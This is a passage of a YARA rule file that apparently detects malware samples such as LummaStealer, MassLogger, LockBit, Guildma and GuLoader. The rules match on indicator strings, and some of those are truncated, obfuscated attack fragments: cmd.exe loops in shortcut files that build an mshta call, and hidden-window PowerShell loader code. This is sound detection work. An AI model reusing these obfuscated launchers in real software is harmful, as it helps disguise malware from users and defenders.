      $s8 = "[!] Failed to run async command: %s. Error: %s" fullword wide /* score: '21.00'*/
      $s9 = "[!] Failed to run sync command: %s. Error: %s" fullword wide /* score: '21.00'*/
      $s10 = "[!] Failed to get shell window" fullword wide /* score: '20.00'*/
      $s11 = "start explorer.exe" fullword wide /* score: '19.00'*/
      $s12 = "[-] Run sync command: %s" fullword wide /* score: '19.00'*/
      $s13 = "CryptGetKeyParam for public key failed, size " fullword ascii /* score: '18.00'*/
      $s14 = "CryptGetKeyParam for private key failed, size " fullword ascii /* score: '18.00'*/
      $s15 = "AssignProcessToJobObject failed" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__44627be8eb48697f58c3da6cb547692a_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_44627be8eb48697f58c3da6cb547692a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f87d471762bd42cdc93ad464b7b22d8b9205beca242c7529eda5f39a4ad1b98f"
   strings:
      $x1 = "C:\\Users\\admin\\Desktop\\1234\\cr\\crypt\\premium_crypt\\47a6f4fe-a5ea-41b5-a014-2c08a8ce633b\\FastCrypt.pdb" fullword ascii /* score: '31.00'*/
      $s2 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s3 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s4 = "kBEyEvg" fullword ascii /* score: '9.00'*/
      $s5 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s6 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s7 = "nullptr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__0a5f762c46ae2a8b364917c90f1df46a_imphash__fd387522 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_0a5f762c46ae2a8b364917c90f1df46a(imphash)_fd387522.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd3875225c1ab60e6dc52fc8f94b4d389624592b7e7b57ee86e54cebe5d3eb6a"
   strings:
      $s1 = "icu.dll" fullword wide /* score: '20.00'*/
      $s2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword ascii /* score: '17.00'*/
      $s3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword ascii /* score: '17.00'*/
      $s4 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword ascii /* score: '17.00'*/
      $s5 = "C:\\local\\boost_1_75_0\\boost/uuid/detail/sha1.hpp" fullword ascii /* score: '15.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "APPBKEYREAD" fullword ascii /* score: '12.50'*/
      $s8 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s9 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s10 = "temp_directory_path" fullword ascii /* score: '11.00'*/
      $s11 = "APPBKEYWRITE" fullword ascii /* score: '9.50'*/
      $s12 = "APPBKEYR" fullword ascii /* score: '9.50'*/
      $s13 = "APPBKEYW" fullword ascii /* score: '9.50'*/
      $s14 = "object key" fullword ascii /* score: '9.00'*/
      $s15 = "ucal_getTZDataVersion" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule LummaStealer_signature__287b58ea7430d943e18999fdb9bc3fc4_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_287b58ea7430d943e18999fdb9bc3fc4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "874db4ca5db163b737878830554592cdcf8b4deff6a8861b863e036507f66940"
   strings:
      $s1 = "icu.dll" fullword wide /* score: '20.00'*/
      $s2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword ascii /* score: '17.00'*/
      $s3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword ascii /* score: '17.00'*/
      $s4 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword ascii /* score: '17.00'*/
      $s5 = "C:\\local\\boost_1_75_0\\boost/uuid/detail/sha1.hpp" fullword ascii /* score: '15.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "APPBKEYREAD" fullword ascii /* score: '12.50'*/
      $s8 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s9 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s10 = "temp_directory_path" fullword ascii /* score: '11.00'*/
      $s11 = "APPBKEYWRITE" fullword ascii /* score: '9.50'*/
      $s12 = "APPBKEYR" fullword ascii /* score: '9.50'*/
      $s13 = "APPBKEYW" fullword ascii /* score: '9.50'*/
      $s14 = "object key" fullword ascii /* score: '9.00'*/
      $s15 = "ucal_getTZDataVersion" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule LummaStealer_signature__7df17fdf2b13858269da579a5ae60eca_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_7df17fdf2b13858269da579a5ae60eca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e683db1a30ff19c51aaea8092ce62d1a8c33fab79ba12e90ac9a56475dcda3f2"
   strings:
      $s1 = "icu.dll" fullword wide /* score: '20.00'*/
      $s2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword ascii /* score: '17.00'*/
      $s3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword ascii /* score: '17.00'*/
      $s4 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword ascii /* score: '17.00'*/
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s6 = "APPBKEYREAD" fullword ascii /* score: '12.50'*/
      $s7 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s8 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s9 = "temp_directory_path" fullword ascii /* score: '11.00'*/
      $s10 = "APPBKEYWRITE" fullword ascii /* score: '9.50'*/
      $s11 = "object key" fullword ascii /* score: '9.00'*/
      $s12 = "ucal_getTZDataVersion" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a2baea78 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a2baea78.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a2baea783b7929235c15f8b354fdb7a4dc5a251c97a0c3973cedd4eaa6dccf2a"
   strings:
      $s1 = "gDFs.exe" fullword wide /* score: '22.00'*/
      $s2 = "user@example.com" fullword wide /* score: '21.00'*/
      $s3 = "Ampersand '&' should be encoded as '&amp;'" fullword wide /* score: '16.00'*/
      $s4 = "Attribute syntax error - attributes should be in format: name=\"value\"" fullword wide /* score: '15.00'*/
      $s5 = "* Copyright " fullword ascii /* score: '14.00'*/
      $s6 = "gDFs.pdb" fullword ascii /* score: '14.00'*/
      $s7 = "HTML_Validation_Errors.txt" fullword wide /* score: '14.00'*/
      $s8 = "Export Complete" fullword wide /* score: '12.00'*/
      $s9 = "get_HTMLVersion" fullword ascii /* score: '12.00'*/
      $s10 = "get_SaveValidationReports" fullword ascii /* score: '12.00'*/
      $s11 = "Line {0}: {1} - {2}" fullword wide /* score: '12.00'*/
      $s12 = "Help - HTML Validator" fullword wide /* score: '12.00'*/
      $s13 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s14 = "Empty Content" fullword wide /* score: '11.00'*/
      $s15 = "HTMLValidator.Forms.ValidationErrorsForm.resources" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6ea116b5 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6ea116b5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6ea116b59ac03c3211143de70e7ed3843d57a39b0c87936e58d1c5c8e17b439b"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADkF" fullword ascii /* score: '27.00'*/
      $s2 = "OXHl.exe" fullword wide /* score: '22.00'*/
      $s3 = "support@lotterysimulation.com" fullword wide /* score: '21.00'*/
      $s4 = "http://tempuri.org/DataSet1.xsd" fullword wide /* score: '17.00'*/
      $s5 = "https://github.com/lottery-simulation" fullword wide /* score: '17.00'*/
      $s6 = "* Copyright " fullword ascii /* score: '14.00'*/
      $s7 = "OXHl.pdb" fullword ascii /* score: '14.00'*/
      $s8 = "Lottery Simulation - Main" fullword wide /* score: '12.00'*/
      $s9 = "columnHeaderSet" fullword ascii /* score: '9.00'*/
      $s10 = "get_ConfirmClear" fullword ascii /* score: '9.00'*/
      $s11 = "columnHeaderMostFreq" fullword ascii /* score: '9.00'*/
      $s12 = "columnHeaderLeastFreq" fullword ascii /* score: '9.00'*/
      $s13 = "get_DefaultNumberCount" fullword ascii /* score: '9.00'*/
      $s14 = "columnHeaderMostPercent" fullword ascii /* score: '9.00'*/
      $s15 = "'OlviRc=[" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8c8055b3 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8c8055b3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c8055b3951939c3c52f0be27f017a2e6905aa6720582b797de6d6f8a8d4caac"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD#sY" fullword ascii /* score: '27.00'*/
      $s2 = "zzco.exe" fullword wide /* score: '22.00'*/
      $s3 = "<GetSystemPrinters>b__12_0" fullword ascii /* score: '19.00'*/
      $s4 = "GetSystemPrinters" fullword ascii /* score: '19.00'*/
      $s5 = "* Copyright " fullword ascii /* score: '14.00'*/
      $s6 = "zzco.pdb" fullword ascii /* score: '14.00'*/
      $s7 = "Contract_Template.pdf" fullword wide /* score: '14.00'*/
      $s8 = "<GetCompletedJobsCount>b__19_0" fullword ascii /* score: '12.00'*/
      $s9 = "GetCompletedJobsCount" fullword ascii /* score: '12.00'*/
      $s10 = "Meeting_Notes.txt" fullword wide /* score: '11.00'*/
      $s11 = "Report_Q3_2023.pdf" fullword wide /* score: '10.00'*/
      $s12 = "john.doe" fullword wide /* score: '10.00'*/
      $s13 = "<GetPrintJobsByStatus>b__0" fullword ascii /* score: '9.00'*/
      $s14 = "<GetPrintJobById>b__0" fullword ascii /* score: '9.00'*/
      $s15 = "GetNextJobId" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule LockBit_signature_ {
   meta:
      description = "_subset_batch - file LockBit(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ea5afbc166c4e23498aa9747be81ceaf8dad90b8daa07a6e4644dc7c2277b82"
   strings:
      $s1 = "Blender.exe" fullword wide /* score: '22.00'*/
      $s2 = "D$ .dll" fullword ascii /* score: '17.00'*/
      $s3 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s4 = "cert@borgwarner.com1" fullword ascii /* score: '11.00'*/
      $s5 = "  <description>Blender</description>" fullword ascii /* score: '10.00'*/
      $s6 = "    processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule LockBit_signature__180e93a0 {
   meta:
      description = "_subset_batch - file LockBit(signature)_180e93a0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "180e93a091f8ab584a827da92c560c78f468c45f2539f73ab2deb308fb837b38"
   strings:
      $s1 = "Hgl.exe" fullword wide /* score: '19.00'*/
      $s2 = "D$ .dll" fullword ascii /* score: '17.00'*/
      $s3 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s4 = "cert@conocophillips.com1" fullword ascii /* score: '11.00'*/
      $s5 = "    processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s6 = "  <description>Hgl</description>" fullword ascii /* score: '10.00'*/
      $s7 = "Operations1&0$" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e37f96ff6552e4f0f321f91149140252b0b6ff11c0c980d189eb428e68a9fc31"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "regview.exe" fullword wide /* score: '22.00'*/
      $s3 = " Install System v9.31.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s4 = "$3:a\\5>6" fullword ascii /* score: '9.00'*/ /* hex encoded string ':V' */
      $s5 = "regview" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Loki_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5c636cb6 {
   meta:
      description = "_subset_batch - file Loki(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c636cb6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5c636cb6db8855128f635a9a92ecb2c806bbce65fbaaa2321fb43fb157054cfb"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD>" fullword ascii /* score: '27.00'*/
      $s2 = "C:\\Users\\User\\Documents" fullword ascii /* score: '24.00'*/
      $s3 = "oVTI.exe" fullword wide /* score: '22.00'*/
      $s4 = "comparison_report_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '20.00'*/
      $s5 = "set_ProcessorCount" fullword ascii /* score: '15.00'*/
      $s6 = "<ProcessorCount>k__BackingField" fullword ascii /* score: '15.00'*/
      $s7 = "Baseline [{0:yyyy-MM-dd HH:mm:ss}] - CPU: {1:F1}%, Memory: {2:F1}%, Disk: {3:F1}%, Network: {4:F1} Mbps" fullword wide /* score: '15.00'*/
      $s8 = "Processors: {0}" fullword wide /* score: '15.00'*/
      $s9 = "Win32_Processor.DeviceID='CPU0'" fullword wide /* score: '15.00'*/
      $s10 = "SELECT Name, MaxClockSpeed FROM Win32_Processor" fullword wide /* score: '15.00'*/
      $s11 = "Comparison Results (Baseline 2 - Baseline 1)" fullword wide /* score: '15.00'*/
      $s12 = "get_NetworkUsage" fullword ascii /* score: '14.00'*/
      $s13 = "GetMemoryUsage" fullword ascii /* score: '14.00'*/
      $s14 = "GetMemoryUsageAlternative" fullword ascii /* score: '14.00'*/
      $s15 = "GetCpuUsage" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead3e1cb0db44b9594135a3a395c5d8e510bce1a0f938146df16a67d75a8e68"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\ABqnqqjBcF\\src\\obj\\Debug\\NKDW.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "stem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s4 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s5 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s6 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s7 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD[" fullword ascii /* score: '27.00'*/
      $s8 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s9 = "NKDW.exe" fullword wide /* score: '22.00'*/
      $s10 = "Select * From Table_Secretarys Where SecretaryTC=@p1 and SecretaryPassword=@p2" fullword wide /* score: '19.00'*/
      $s11 = "The deletion process failed" fullword wide /* score: '18.00'*/
      $s12 = "Select * from Table_Patients where PatientTC=@p1 and PatientPassWord=@p2" fullword wide /* score: '16.00'*/
      $s13 = "btnLogin" fullword wide /* score: '15.00'*/
      $s14 = "btnLogin_Click" fullword ascii /* score: '15.00'*/
      $s15 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule GENTLEMEN_signature_ {
   meta:
      description = "_subset_batch - file GENTLEMEN(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f8b07ce20ae77fec0905724a466196a5ba8281e9ba9534808ab7e7bf15f37516"
   strings:
      $s1 = "README-GENTLEMEN.txt" fullword ascii /* score: '14.00'*/
      $s2 = "README-GENTLEMEN.txtUT" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3KB and
      all of them
}

rule HawkEye_signature__a50e815adb2cfe3e58d388c791946db8_imphash_ {
   meta:
      description = "_subset_batch - file HawkEye(signature)_a50e815adb2cfe3e58d388c791946db8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e10f6b7765ac7a6935c33fca91ca119e70872d22e5587871a5ec1d3b4a98f239"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii /* score: '58.00'*/
      $s2 = " or \"requireAdministrator\" --> <v3:requestedExecutionLevel level=\"requireAdministrator\" /> </v3:requestedPrivileges> </v3:se" ascii /* score: '28.00'*/
      $s3 = "> <dependency> <dependentAssembly> <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0" ascii /* score: '15.00'*/
      $s4 = "SSEwQDNuf" fullword ascii /* base64 encoded string 'I!0@3n' */ /* score: '14.00'*/
      $s5 = "v3=\"urn:schemas-microsoft-com:asm.v3\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \"asInvoker\", \"highestAvaila" ascii /* score: '14.00'*/
      $s6 = "cessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /> </dependentAssembly> </dependency> <v3:trustInfo " ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and all of them
}

rule Metasploit_signature__d1cea82e786317a9f928832b3c274bd4_imphash_ {
   meta:
      description = "_subset_batch - file Metasploit(signature)_d1cea82e786317a9f928832b3c274bd4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "83a237bd8956ab74d8c28bbce44d6a10151b3a52c684f5756de085f7cfcffe65"
   strings:
      $s1 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s2 = "UnpadErrorInvalidByteInvalidLengthInvalidLastSymbolInvalidPaddingdecoded length calculation overflowE:\\Env\\Rust\\.cargo\\regis" ascii /* score: '23.00'*/
      $s3 = "UnpadErrorInvalidByteInvalidLengthInvalidLastSymbolInvalidPaddingdecoded length calculation overflowE:\\Env\\Rust\\.cargo\\regis" ascii /* score: '23.00'*/
      $s4 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s5 = "\\\\fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '19.00'*/
      $s6 = "internal error: entered unreachable codeE:\\Env\\Rust\\.rustup\\toolchains\\nightly-2024-06-26-x86_64-pc-windows-msvc\\lib\\rust" ascii /* score: '19.00'*/
      $s7 = "fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '18.00'*/
      $s8 = "bypass\\crypto\\src\\lib.rsh" fullword ascii /* score: '18.00'*/
      $s9 = "\\rust\\library\\std\\src\\thread\\mod.rsE:\\Env\\Rust\\.rustup\\toolchains\\nightly-2024-06-26-x86_64-pc-windows-msvc\\lib\\rus" ascii /* score: '17.00'*/
      $s10 = "?E:\\Env\\Rust\\.rustup\\toolchains\\nightly-2024-06-26-x86_64-pc-windows-msvc\\lib\\rustlib\\src\\rust\\library\\alloc\\src\\sy" ascii /* score: '16.00'*/
      $s11 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s12 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\reentrant_lock.rs" fullword ascii /* score: '15.00'*/
      $s13 = "5.153.45.61" fullword ascii /* score: '14.00'*/ /* hex encoded string 'QSEa' */
      $s14 = "JRYZDT.pdb" fullword ascii /* score: '14.00'*/
      $s15 = "ist too longoperation interruptedunsupportedunexpected end of fileout of memoryother erroruncategorized error (os error )" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule Havoc_signature__85a4fdbc4ccbab7e4e7848fc982c7aac_imphash_ {
   meta:
      description = "_subset_batch - file Havoc(signature)_85a4fdbc4ccbab7e4e7848fc982c7aac(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "534af8897745ae7f6fc509d191bd66c28b3c5485b35fcaeeb50dbe6fb19060a1"
   strings:
      $x1 = "C:\\Users\\windows\\Music\\stux2\\x64\\Release\\stux2.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s3 = "MyDownloader" fullword ascii /* score: '19.00'*/
      $s4 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s5 = ".data$rs" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule Guildma_signature_ {
   meta:
      description = "_subset_batch - file Guildma(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ede0484820ebd30f6dc3e8efa74e55b6e621bdeb39da896259356201bcedb627"
   strings:
      $s1 = "wiNDOWs\\System32\\Cmd.exe" fullword ascii /* score: '28.00'*/
      $s2 = "C:\\wiNDOWs\\SysTEm32C" fullword ascii /* score: '21.00'*/
      $s3 = " /IAISK:K4XO /IQAT:CRCC /D/C \"for %D in (avA) do for %G in (ht) do for %O in (m) do for %Z in (scR) do %OS%Ga \"j%D%Zipt:window" ascii /* score: '15.00'*/
      $s4 = " /IAISK:K4XO /IQAT:CRCC /D/C \"for %D in (avA) do for %G in (ht) do for %O in (m) do for %Z in (scR) do %OS%Ga \"j%D%Zipt:window" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 5KB and
      all of them
}

rule Guildma_signature__fcf697e4 {
   meta:
      description = "_subset_batch - file Guildma(signature)_fcf697e4.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fcf697e4b449d9819a57746eaec03b8cd8102795810b9130df032cfce50f6b1d"
   strings:
      $s1 = "wiNDOWs\\System32\\Cmd.exe" fullword ascii /* score: '28.00'*/
      $s2 = "C:\\wiNDOWs\\SysTEm32I" fullword ascii /* score: '21.00'*/
      $s3 = " /JYOAJ:WTP5 /JRPE:IAGS /D/C \"for %E in (avA) do for %H in (ht) do for %P in (m) do for %Y in (scR) do %PS%Ha \"j%E%Yipt:window" ascii /* score: '12.00'*/
      $s4 = " /JYOAJ:WTP5 /JRPE:IAGS /D/C \"for %E in (avA) do for %H in (ht) do for %P in (m) do for %Y in (scR) do %PS%Ha \"j%E%Yipt:window" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 5KB and
      all of them
}

rule Guildma_signature__2 {
   meta:
      description = "_subset_batch - file Guildma(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4185b0c082ff2bd8d2488b90963f35b580a4bae453379633dbc6ada942922163"
   strings:
      $s1 = "contrato_PDF_79055.lNkUT" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5KB and
      all of them
}

rule Guildma_signature__9bfab8b1 {
   meta:
      description = "_subset_batch - file Guildma(signature)_9bfab8b1.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9bfab8b1e662daac7a624b534480583893f0a2432126e68f80ed296172f00404"
   strings:
      $s1 = "Ocorrencia_2025_134324.lNkUT" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5KB and
      all of them
}

rule GuLoader_signature_ {
   meta:
      description = "_subset_batch - file GuLoader(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a20fe52a6da7f1cc20fff07137e419904d9a42756d018c8ca1939a904ca1db56"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Dkningsstyrken ($tarvelighedens){ $saftholdiges=1;do {$proposedly+=$ta" ascii /* score: '32.00'*/
      $s2 = "powershell.exe -windowstyle hidden \"Get-DiskSNV;function Dkningsstyrken ($tarvelighedens){ $saftholdiges=1;do {$proposedly+=$ta" ascii /* score: '28.00'*/
      $s3 = "alamandarin=(Dkningsstyrken 'x$ G lxoxbxA L :xUxd S TxYxrxsxFxOxr R Ext,NxIxnxG,=.N.Exw - Oxb j.excxTx xs Yxs txExm .x$ d.IxSxK " ascii /* score: '15.00'*/
      $s4 = "8207;Stuers (Dkningsstyrken ' $ G L{o{b{a l{:{s{t{a{g n{e, .=  {g{E t - c o{N{T.e n{t{ {$ P{a{s S a,m{E{Z Z o');Stuers (Dkningss" ascii /* score: '12.00'*/
      $s5 = "e='\\Melaniferous.Jen';Stuers (Dkningsstyrken 'b$ gblbobbbAbL :bt,R EbsbTbl.E Sb9b5b= $.e Nbvb:ba pbpbDbabTbab+ $ HbobL Dbbba Rb" ascii /* score: '11.00'*/
      $s6 = "Dkningsstyrken '^$^g l^O B.A^L^: E N^t^E^R^O c^h,L^o^R^O^p H^y^l^l^=,$^g^l O b,a^L :^V^O^l U^b i l^i^t^y.+ +^%% $^H^U D^a F s^k^" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__2 {
   meta:
      description = "_subset_batch - file GuLoader(signature).cmd"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7c40b0d4d8cbcc5fbc0f30b40d9da7cf829a21dae1a6a50fb9f0100084591ddb"
   strings:
      $x1 = "powershell.exe -windowstyle hidden \"spsv uddannnel;function Brudtesna ($teatrali,$nominal=0){ $snuetheadl=3;do {$vertebr+=$teat" ascii /* score: '44.00'*/
